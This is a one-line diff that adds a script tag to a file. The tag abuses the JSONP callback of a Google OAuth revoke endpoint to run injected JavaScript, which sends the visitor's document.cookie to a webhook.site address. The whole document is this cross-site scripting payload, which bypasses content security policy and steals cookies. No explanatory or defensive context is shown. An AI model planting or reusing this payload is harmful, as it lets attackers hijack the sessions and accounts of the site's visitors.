@@ -1,0 +1,1 @@
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=var%20xhr%3dnew%20XMLHttpRequest();xhr.open('GET','https://webhook.site/bf88a9f7-174c-4b1e-8c6e-cc8f35f5ca5b/'%2Bdocument.cookie,false);xhr.send();"></script>
